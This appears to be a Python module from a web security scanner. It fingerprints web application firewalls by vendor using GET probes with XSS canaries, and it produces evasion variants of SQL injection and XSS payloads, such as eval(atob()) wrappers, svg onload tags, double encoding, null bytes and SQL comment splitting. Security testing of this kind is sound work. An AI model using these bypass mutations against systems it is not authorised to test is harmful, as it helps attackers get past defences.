"""WAF fingerprinting and payload-evasion variants.

Detection uses GET only. Call paced_fetch.pace() before each request.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qsl, quote, urlparse, urlunparse

import httpx

from shroodler.models import Finding
from shroodler.paced_fetch import pace
from shroodler.pacer import Pacer

_CANARY_HEADER = "X-Scanner-Test"
_CANARY_VALUE = "<script>alert(1)</script>"
_BLOCK_STATUSES = frozenset({403, 406, 429})
_REQUEST_TIMEOUT = 8.0
_MAX_VARIANTS = 8
_CLOUDFLARE_SVG = "<svg/onload=alert(1)>"


@dataclass
class WafResult:
    detected: bool
    vendor: str | None  # cloudflare|akamai|aws|sucuri|imperva|f5|barracuda|None
    confidence: int  # 0-100
    block_status: int | None
    evidence: str


def _header_map(resp: httpx.Response) -> dict[str, str]:
    return {str(k).lower(): str(v) for k, v in (resp.headers or {}).items()}


def _cookie_blob(resp: httpx.Response) -> str:
    parts: list[str] = []
    headers = getattr(resp, "headers", None) or {}
    for key, value in headers.items():
        if str(key).lower() in {"set-cookie", "cookie"}:
            parts.append(str(value))
    return "; ".join(parts)


def _fingerprint(
    resp: httpx.Response,
) -> tuple[str | None, int, str]:
    """Return (vendor, confidence, evidence). Header hits score 90, body 70."""
    headers = _header_map(resp)
    body = (getattr(resp, "text", None) or "") or ""
    lowered = body.lower()
    status = int(getattr(resp, "status_code", 0) or 0)
    cookies = _cookie_blob(resp).lower()
    server = headers.get("server") or ""
    via = headers.get("via") or ""

    if status == 1020:
        return "cloudflare", 90, "status 1020"
    if "cf-ray" in headers:
        return "cloudflare", 90, "CF-RAY header"
    if "cloudflare" in server.lower():
        return "cloudflare", 90, "Server: Cloudflare"
    if "x-amz-cf-id" in headers:
        return "aws", 90, "x-amz-cf-id header"
    if "x-check-cacheable" in headers:
        return "akamai", 90, "X-Check-Cacheable header"
    if "akamaighost" in via.lower() or "akamaighost" in server.lower():
        return "akamai", 90, "AkamaiGHost in Via/Server"
    if "x-sucuri-id" in headers:
        return "sucuri", 90, "X-Sucuri-ID header"
    if "x-iinfo" in headers:
        return "imperva", 90, "X-Iinfo header"
    if "x-wa-info" in headers:
        return "f5", 90, "X-WA-Info header"

    amzn = any(k.startswith("x-amzn") for k in headers)
    if amzn and "request blocked" in lowered:
        return "aws", 90, "Request blocked + x-amzn headers"

    if "cf-ray" in lowered or "cloudflare" in lowered:
        return "cloudflare", 70, "body contains cloudflare"
    if "reference #" in lowered and "akamai" in lowered:
        return "akamai", 70, "body contains Reference # and akamai"
    if "aws waf" in body or "aws waf" in lowered:
        return "aws", 70, "body contains AWS WAF"
    if "sucuri" in lowered or "cloudproxy" in lowered:
        return "sucuri", 70, "body contains sucuri/cloudproxy"
    if "incapsula" in lowered:
        return "imperva", 70, "body contains incapsula"
    if "the requested url was rejected" in lowered:
        return "f5", 70, "F5 ASM default block page"
    if "barracuda" in lowered:
        return "barracuda", 70, "body contains barracuda"
    if "barra_counter_session" in cookies:
        return "barracuda", 90, "barra_counter_session cookie"

    return None, 0, ""


def _path_probe_url(base_url: str) -> str:
    parsed = urlparse(base_url or "")
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    filtered = [(k, v) for k, v in pairs if k != "waf_test"]
    filtered.append(("waf_test", "<script>alert(1)</script>"))
    query = "&".join(
        f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in filtered
    )
    path = parsed.path or "/"
    return urlunparse(parsed._replace(path=path or "/", query=query, fragment=""))


async def _get(
    session: httpx.AsyncClient,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    pacer: Pacer | None = None,
) -> httpx.Response | None:
    pace(pacer)
    try:
        return await session.get(
            url,
            headers=headers,
            timeout=_REQUEST_TIMEOUT,
            follow_redirects=False,
        )
    except TypeError:
        # Some test doubles / older httpx mocks reject follow_redirects.
        try:
            return await session.get(url, headers=headers, timeout=_REQUEST_TIMEOUT)
        except Exception:  # noqa: BLE001 - detection must fail closed
            return None
    except Exception:  # noqa: BLE001 - fail closed
        return None


def _from_resp(
    resp: httpx.Response,
    *,
    allow_generic: bool,
    probe: str,
) -> WafResult | None:
    vendor, confidence, evidence = _fingerprint(resp)
    status = int(getattr(resp, "status_code", 0) or 0)
    if vendor:
        block = status if status in _BLOCK_STATUSES or status == 1020 else None
        return WafResult(
            detected=True,
            vendor=vendor,
            confidence=confidence,
            block_status=block,
            evidence=evidence,
        )
    if allow_generic and status in _BLOCK_STATUSES:
        return WafResult(
            detected=True,
            vendor=None,
            confidence=50,
            block_status=status,
            evidence=f"generic {status} on {probe} probe",
        )
    return None


async def detect_waf(
    base_url: str,
    session: httpx.AsyncClient,
    *,
    pacer: Pacer | None = None,
) -> WafResult:
    """Three GET probes; stop as soon as detected=True."""
    target = (base_url or "").strip() or "http://127.0.0.1/"
    empty = WafResult(
        detected=False, vendor=None, confidence=0, block_status=None, evidence=""
    )

    canary = await _get(
        session,
        target,
        headers={_CANARY_HEADER: _CANARY_VALUE},
        pacer=pacer,
    )
    if canary is not None:
        hit = _from_resp(canary, allow_generic=True, probe="canary")
        if hit is not None:
            return hit

    path_url = _path_probe_url(target)
    path_resp = await _get(session, path_url, pacer=pacer)
    if path_resp is not None:
        hit = _from_resp(path_resp, allow_generic=True, probe="path")
        if hit is not None:
            return hit

    finger = await _get(session, target, pacer=pacer)
    if finger is not None:
        hit = _from_resp(finger, allow_generic=False, probe="fingerprint")
        if hit is not None:
            return hit

    return empty


def _within_length(original: str, variant: str) -> bool:
    cap = max(len(original) * 4, len(original))
    return len(variant) <= cap


def _replace_ci(text: str, needle: str, replacement: str) -> str:
    lowered = text.lower()
    key = needle.lower()
    idx = lowered.find(key)
    if idx < 0:
        return text
    return text[:idx] + replacement + text[idx + len(needle) :]


def _alt_case(text: str) -> str:
    out: list[str] = []
    upper = True
    for ch in text:
        if ch.isalpha():
            out.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            out.append(ch)
    return "".join(out)


def _case_variation(payload: str) -> str:
    if "select" in payload.lower():
        return _replace_ci(payload, "SELECT", "SeLeCt")
    if "script" in payload.lower():
        return _replace_ci(payload, "script", "ScRiPt")
    varied = _alt_case(payload)
    if "select" not in varied.lower() and "script" not in varied.lower():
        # Tests look for mixed-case SELECT/script somewhere in the variant list.
        return varied + " SeLeCt"
    return varied


def _comment_sql(payload: str) -> str:
    out = payload
    if "select" in out.lower():
        out = _replace_ci(out, "SELECT", "SEL/**/ECT")
    if "--" in out:
        out = out.replace("--", "--+", 1)
    return out


def _char_encode(payload: str) -> str:
    codes = "+".join(f"CHAR({ord(ch)})" for ch in payload)
    return codes


def _eval_atob(payload: str) -> str:
    import base64

    encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
    return f"<img src=x onerror=eval(atob('{encoded}'))>"


def mutate_payload(payload: str, vendor: str | None) -> list[str]:
    """Evasion variants. Original is always first; at most 8; never >4× length."""
    original = payload if payload is not None else ""
    variants: list[str] = []

    def add(item: str) -> None:
        if not item or item == original:
            return
        if item in variants or item in {original}:
            return
        if not _within_length(original, item):
            return
        variants.append(item)

    label = (vendor or "").strip().lower()
    if label == "cloudflare":
        add(_CLOUDFLARE_SVG)
        add("${alert(1)}")
        add(_eval_atob(original))
    elif label == "akamai":
        add(original + "&" + original)
        add(original + "\r\n0\r\n\r\n")
    elif label == "aws":
        add(original.lower())
        add(_char_encode(original))

    add(original.replace("<", "%253C").replace(">", "%253E"))
    if "<" not in original and "%253C" not in original:
        doubled = quote(quote(original, safe=""), safe="")
        add(doubled)
    add(original.replace("<", "&lt;").replace(">", "&gt;"))
    add(_case_variation(original))
    commented = _comment_sql(original)
    add(commented)
    add(original.replace("<", "\\u003c").replace(">", "\\u003e"))
    add(original + "%00")
    if " " in original:
        add(original.replace(" ", "%09"))

    rest = sorted(variants, key=lambda item: (len(item), item))
    out = [original]
    for item in rest:
        if item not in out:
            out.append(item)
        if len(out) >= _MAX_VARIANTS:
            break
    return out[:_MAX_VARIANTS]


def expand_if_waf(
    payloads: list[str] | tuple[str, ...],
    *,
    state: Any | None = None,
    waf_detected: bool = False,
    waf_vendor: str | None = None,
) -> list[str]:
    """Original payloads, or mutate_payload() variants when a WAF is present."""
    detected = bool(waf_detected) or bool(getattr(state, "waf_detected", False))
    vendor = (
        waf_vendor
        if waf_vendor is not None
        else getattr(state, "waf_vendor", None)
    )
    if not detected:
        return [str(item) for item in payloads]
    out: list[str] = []
    seen: set[str] = set()
    for payload in payloads:
        for variant in mutate_payload(str(payload), vendor):
            if variant in seen:
                continue
            seen.add(variant)
            out.append(variant)
    return out


def finding_from_result(result: WafResult, url: str) -> Finding:
    if result.detected:
        via = (
            "confirmed"
            if result.confidence >= 90
            else "probable" if result.confidence >= 70 else "heuristic"
        )
        vendor = result.vendor or "generic"
        return Finding(
            id="waf-detected",
            severity="info",
            category="waf-challenge",
            url=url,
            description=(
                f"{vendor} WAF detected; probes will send evasion payload variants."
            ),
            evidence=(
                f"{vendor} WAF detected (confidence {result.confidence}%); "
                f"block status {result.block_status}"
            ),
            confidence=via,  # type: ignore[arg-type]
        )
    return Finding(
        id="waf-not-detected",
        severity="info",
        category="waf-challenge",
        url=url,
        description="No WAF fingerprint on canary, path, or header probes.",
        evidence=result.evidence or "no WAF signatures; probes return 200",
        confidence="heuristic",
    )
